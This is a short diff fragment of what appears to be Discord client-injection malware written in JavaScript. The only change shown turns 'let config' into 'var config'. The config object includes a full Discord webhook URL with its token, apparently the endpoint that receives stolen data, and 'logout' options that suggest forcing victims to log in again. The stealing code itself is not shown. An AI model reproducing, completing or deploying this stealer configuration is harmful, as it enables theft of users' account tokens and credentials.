@@ -5,7 +5,7 @@ const electron = require("electron");
 const https = require("https");
 const queryString = require("querystring");
 
-let config = {
+var config = {
  webhook: "https://canary.discord.com/api/webhooks/1365804617744777279/ovBDwu1u3VSrD1H4x46qfuoNfpL8LAw8lI0DWfugeJBwbVrJYymafLiCPm137yMptnag",
  logout: "true",
  "logout-notify": "true",
